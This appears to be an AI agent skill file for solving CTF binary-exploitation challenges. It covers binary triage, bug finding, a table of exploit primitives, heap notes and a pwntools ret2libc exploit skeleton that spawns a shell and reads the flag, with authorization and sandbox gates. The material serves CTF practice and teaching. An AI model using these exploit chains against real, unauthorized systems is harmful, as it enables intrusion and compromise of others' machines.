---
name: ctf-pwn
description: Use when solving binary exploitation / pwn CTF challenges — buffer overflows, ROP, format strings, heap, kernel pwn. Provides a decision tree, exploit primitive catalog, and uses pwntools via the run_script(venv="pwntools") MCP path. Triggers on "ctf pwn", "binary exploit", "rop", "buffer overflow", "format string", "heap challenge".
---

# CTF pwn methodology

> **Pre-flight.** Confirm the event rules allow AI assistance (`authorization-gate`). Start with `suggest_for_ctf` or `guided_assessment`. Commands below are CLI notation: run them with `run_tool`/`run_pipeline` using registry names (`list_tools`), and `run_script` only for real logic. If policy blocks a command, tell the operator; do not fall back to the client shell. A tool that is not in the registry is a recommendation to the user (approval-gated install), not a bare command.

## 0. Pwntools

`./install.sh --module pwn` installs pwntools through pipx. `run_script` is disabled unless the operator sets `CYBERSEC_MCP_ALLOW_SCRIPTS=1`, and it carries no scope policy, so scope stays the operator's responsibility there.

For `run_script(code, venv="pwntools")`, the operator creates the venv (not governed by the installer; installs need user approval):

```bash
python3 -m venv "${CYBERSEC_MCP_VENVS_DIR:-$HOME/.ctf-venvs}/pwntools"
"${CYBERSEC_MCP_VENVS_DIR:-$HOME/.ctf-venvs}/pwntools/bin/pip" install pwntools z3-solver
```

## 1. Identify the binary

```text
run_tool("file", "./vuln")
run_tool("checksec", "--file=./vuln")
run_pipeline([{"tool": "strings", "args": "./vuln"}, {"tool": "head", "args": "-50"}])
run_pipeline([{"tool": "nm", "args": "./vuln"}, {"tool": "head", "args": "-30"}])   # symbols if not stripped
```

Note: `RELRO`, `Canary`, `NX`, `PIE`, arch (x86 / x86_64 / arm / mips), libc version.

If a libc is provided, identify it:

```text
run_pipeline([{"tool": "strings", "args": "libc.so.6"}, {"tool": "grep", "args": "GNU C Library"}])
```

`libc-database` and `libc-rip`/`libc.rip` (web) — find offsets by leaked function addresses.

## 2. Find the bug

Static:

- `objdump -d -M intel ./vuln`
- Ghidra / `cutter` (radare2 GUI) for decompile; check `list_tools` before relying on them
- Look for: `gets`, `strcpy`, unbounded `read`, `printf(user_input)`, integer overflow on size, double free, UAF

Dynamic:

- `gdb ./vuln` (or `gdb-multiarch`) with `pwndbg` / `gef` if installed; debugging launches the sample, so do it only inside the sandbox/VM (`docs/SANDBOX.md`)
- Cyclic pattern: `cyclic 200` → run → crash → `cyclic -l <RIP>` to find offset

## 3. Pick the primitive

| Class | Primitive | Tool |
| --- | --- | --- |
| Stack BOF, no canary, NX off | shellcode | `pwntools shellcraft.sh()` |
| Stack BOF, NX on, ASLR off | ret2win / static ROP | `ROPgadget --binary ./vuln` |
| Stack BOF, NX+ASLR, libc leak | ret2libc | leak with PUTS@got, calc system, /bin/sh |
| Stack BOF, NX+ASLR, no leak | ret2plt + puts → leak | classic chain |
| Format string | %n write / %s leak | pwntools `fmtstr_payload` |
| Heap (glibc) | tcache, fastbin, unsorted bin | `how2heap`, `pwndbg heap` |
| Use-after-free | dangling pointer abuse | manual python |
| Kernel | KASLR leak, modprobe_path, etc | manual + qemu |

## 4. Exploit skeleton (pwntools)

```python
from pwn import *

elf = context.binary = ELF("./vuln")
libc = ELF("./libc.so.6")
p = process("./vuln")  # remote("host", 1337) only when the host is in scope

# leak
p.sendlineafter(b"> ", b"A" * 40 + p64(elf.plt['puts']) + p64(elf.sym['main']))
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym['puts']

# pwn
rop = ROP(libc)
rop.raw(rop.find_gadget(['ret']))  # stack align
rop.system(next(libc.search(b"/bin/sh")))
p.sendline(b"A" * 40 + rop.chain())
p.sendline(b"cat flag*")  # run_script is non-interactive: no p.interactive()
print(p.recvall(timeout=3))
```

## 5. Heap (glibc)

- Identify glibc version (matters: 2.27, 2.31, 2.32, 2.34+ differ)
- Useful tcache primitives: tcache poisoning (≥ 2.27), tcache key bypass (≥ 2.32), safe-linking (≥ 2.32)
- Tools: `pwndbg heap`, `glibc-all-in-one`, `how2heap` (clone if not present)

## 6. Don't waste time on

- Manual ROP gadget search if the binary is large — use `ROPgadget` or `ropper`
- Reimplementing pwntools functionality (cyclic, fmtstr, ROP chain building)
- Trying win functions if there's no `system` symbol — check `nm` first

## After solve

Use the `writeup-template` skill. Include the final exploit script verbatim.
